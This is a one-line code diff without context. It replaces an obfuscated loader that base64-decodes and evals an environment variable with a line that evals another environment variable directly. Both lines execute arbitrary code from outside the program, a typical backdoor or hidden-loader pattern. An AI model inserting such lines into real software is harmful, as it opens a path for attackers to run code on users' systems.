@@ -1,1 +1,1 @@
-eval(atob(process.env.A))
+eval(process.env.Q)
